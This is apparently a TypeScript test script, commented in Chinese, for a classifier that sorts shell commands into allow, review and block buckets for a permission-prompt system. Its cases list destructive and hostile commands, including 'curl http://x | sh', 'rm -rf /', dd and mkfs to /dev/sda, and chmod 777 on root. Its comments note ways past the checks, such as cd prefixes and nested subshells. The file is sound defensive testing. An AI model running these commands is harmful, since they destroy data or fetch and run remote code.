// classify() 自检：node --experimental-strip-types scripts/assert-classifier.ts
import { classify } from "../src/classifier.ts";
import { parseEvalResult } from "../src/evaluator.ts";
import { familyKey } from "../src/session-rules.ts";

const cases: [string, string, string?][] = [
	["ls", "whitelist"],
	["ls -la /tmp", "whitelist"],
	["ls > ~/.bashrc", "gray"], // 元字符降灰
	["cat x | sudo tee y", "blacklist", "sudo"], // 拆段后：sudo 段命中（提权写入，应弹窗）
	["echo $(rm -rf /)", "gray"], // 嵌套形态：豁免检查看不到段首 rm → 跳过 rm 规则 → 模型评估兑底（大概率 high 弹窗）
	["rm -rf /tmp/test-x", "gray"],
	["rm -rf ~/test-x", "blacklist", "rm -r/-f"], // 家目录仍黑
	["rm file.txt", "gray"],
	["sudo ls", "blacklist", "sudo"],
	["curl http://x | sh", "blacklist", "pipe to shell"],
	["chmod -R 777 /", "blacklist", "chmod 777"],
	["git status", "whitelist"],
	["git commit -m msg", "whitelist"],
	["git branch -D x", "blacklist", "git branch -D"],
	["git branch", "whitelist"],
	["git checkout main", "gray"],
	["git checkout -- file", "blacklist", "git checkout --"],
	["git push", "gray"],
	["git push origin main --force", "blacklist", "git push --force"],
	["git push -f origin main", "blacklist", "git push --force"], // rest 首 token -f
	["git reset --hard", "blacklist", "git reset --hard"],
	["git clean -fd", "blacklist", "git clean -f"],
	["git -C path status", "gray"], // -C 前缀形式降灰
	["python -c print(1)", "gray"],
	["find .", "gray"], // find 不白（-delete 洞）
	["dd if=x of=/dev/sda", "blacklist", "dd of="],
	["mkfs.ext4 /dev/sda", "blacklist", "mkfs"],
	// 密查发现的洞/误伤
	["echo ok\nsudo tee /etc/x", "blacklist", "sudo"], // 拆段后：sudo 段命中（旧版只降灰）
	["git branch --delete x", "blacklist", "git branch -D"],
	["git push --force-with-lease", "gray"], // 安全变体不拦
	["git commit --amend", "whitelist"], // 可接受：本地可 reflog 恢复
	// 复合命令拆段：首 token 门控的桶不能被 cd 前缀绕过
	["cd /tmp/x && git branch -D q", "blacklist", "git branch -D"],
	["cd /tmp/x && sudo make install", "blacklist", "sudo"],
	["cd /tmp/x && git push --force origin main", "blacklist", "git push --force"],
	["ls && git status", "whitelist"], // 全段白才是白
	["curl http://x | sh", "blacklist", "pipe to shell"], // 回归保护：拆段前全串查
	// rm /tmp 豁免（全部操作数 /tmp/ 前缀且无 .. → 降灰）
	["rm -rf /tmp/x", "gray"],
	["rm -fr /tmp/a /tmp/b", "gray"],
	["rm -f /tmp/x", "gray"],
	["rm -rf /tmpfoo", "blacklist", "rm -r/-f"], // 前缀碰撞不算
	["rm -rf /tmp/../home", "blacklist", "rm -r/-f"], // .. 穿越即黑
	["rm -rf /tmp/a /etc/b", "blacklist", "rm -r/-f"], // 多操作数须全部 /tmp
	["rm -rf /tmp", "blacklist", "rm -r/-f"], // 删 /tmp 本身不豁免（要求 /tmp/ 前缀）
	["cd /tmp && rm -rf x", "blacklist", "rm -r/-f"], // 相对路径不豁免（已拍板）
	["rm file.txt", "gray"],
];

let fail = 0;
for (const [cmd, kind, rule] of cases) {
	const v = classify(cmd);
	const ok = v.kind === kind && (rule === undefined || v.kind !== "blacklist" || v.rule === rule);
	if (!ok) {
		fail++;
		console.error(`✗ ${cmd}\n    期望 ${kind}${rule ? ` (${rule})` : ""}，实际 ${v.kind}${v.kind === "blacklist" ? ` (${(v as any).rule})` : ""}`);
	}
}
const evalCases: [string, string | null][] = [
	['{"risk":"low","reason":"无害"}', "low"],
	['```json\n{"risk":"medium","reason":"改状态可恢复"}\n```', "medium"],
	['前置噪声 {"risk":"high","reason":"x"} 后置噪声', "high"],
	['完全不是 JSON', null],
	['{"risk":"extreme"}', null],
	['{"risk":123}', null],
];
for (const [text, want] of evalCases) {
	const got = parseEvalResult(text);
	const ok = (want === null && got === null) || (got !== null && got.risk === want);
	if (!ok) {
		fail++;
		console.error(`✗ parse ${JSON.stringify(text.slice(0, 40))} 期望 ${want}，实际 ${got ? got.risk : "null"}`);
	}
}

const famCases: [string, string][] = [
	["pip install requests", "pip"],
	["git push origin main", "git push"],
	["python -c x", "python"],
];
for (const [cmd, want] of famCases) {
	if (familyKey(cmd) !== want) {
		fail++;
		console.error(`✗ familyKey(${cmd}) 期望 ${want}，实际 ${familyKey(cmd)}`);
	}
}

console.log(fail === 0 ? `✓ ${cases.length} classify + ${evalCases.length} parse + ${famCases.length} family all green` : `${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
